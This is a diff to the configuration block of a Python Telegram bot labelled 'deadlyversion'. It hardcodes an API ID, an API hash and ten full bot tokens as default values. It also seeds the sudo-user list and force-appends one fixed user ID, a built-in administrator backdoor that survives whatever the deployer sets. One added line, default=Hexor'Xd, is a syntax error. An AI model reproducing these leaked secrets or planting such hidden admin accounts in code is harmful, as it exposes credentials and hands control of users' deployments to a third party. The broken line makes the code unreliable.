@@ -19,33 +19,33 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 deadlyversion = "v0.3.1"
 
 #values
-API_ID = config("API_ID", default=None, cast=int)
-API_HASH = config("API_HASH", default=None)
-ALIVE_PIC = config("ALIVE_PIC", default=None)
-CMD_HNDLR = getenv("CMD_HNDLR", default="!")
-OWNER_NAME = getenv("OWNER_NAME", default=None)
+API_ID = config("API_ID", default="16512922", cast=int)
+API_HASH = config("API_HASH", default="def0fd607aa50be9cca17ad88bb1c94a")
+ALIVE_PIC = config("ALIVE_PIC", default="https://te.legra.ph/file/487c36dad322d0954ffa2.jpg")
+CMD_HNDLR = getenv("CMD_HNDLR", default=".")
+OWNER_NAME = getenv("OWNER_NAME", default=Hexor'Xd)
 HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
 HEROKU_API_KEY = config("HEROKU_API_KEY", None)
-BOT_TOKEN = config("BOT_TOKEN", default=None)
-BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
-BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
-BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
-BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
-BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
-BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
-BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
-BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
-BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
-SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 5256676062 not in SUDO_USERS:
-    SUDO_USERS.append(5256676062)
+BOT_TOKEN = config("BOT_TOKEN", default="5761964481:AAHlBMTCdEYBUpdqsZPDa3FpHL2NWo6NZVo")
+BOT_TOKEN2 = config("BOT_TOKEN2", default="5701080459:AAFVNA5F2F91LoGSo33KdfQIszYAveNL79c")
+BOT_TOKEN3 = config("BOT_TOKEN3", default="5685387387:AAHDS2VSODlaLQUDeAQ2Mssaf0K3LXS1Tok")
+BOT_TOKEN4 = config("BOT_TOKEN4", default="5770109706:AAHHghq3lMwkL0tJv--b_emO09ViBmwfPAI")
+BOT_TOKEN5 = config("BOT_TOKEN5", default="5797169481:AAFHiB_s31irpOH0hC5P6v0NeVUztBrOigA")
+BOT_TOKEN6 = config("BOT_TOKEN6", default="5789335667:AAFJrhnGv8foKoQEegKtZWlL0M7oW2mncZQ")
+BOT_TOKEN7 = config("BOT_TOKEN7", default="5669590288:AAFLxnX7WRvAW3gQklUGu7HmoPOyR3lpJ_k")
+BOT_TOKEN8 = config("BOT_TOKEN8", default="5490575850:AAHCbf-CenolPP7MpVBoDBFpGJylSiGwO7c")
+BOT_TOKEN9 = config("BOT_TOKEN9", default="5602135476:AAH1i0ugI3t0cEVc-9o6y11K1qPVh75v6kg")
+BOT_TOKEN10 = config("BOT_TOKEN10", default="5794094029:AAEsHvBRWeFS3FVA7cKXSeVPLIhzVsCNH50")
+SUDO_USERS = list(map(int, getenv("SUDO_USER", "1964732367 5383898594 5386581247 2007509796 5375583306 1853934817 5369707020 5174301260 5633554091").split()))
+if 1964732367 not in SUDO_USERS:
+    SUDO_USERS.append(1964732367)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(5256676062)
+SUDO_USERS.append(1964732367)
 
 # Tokens
 
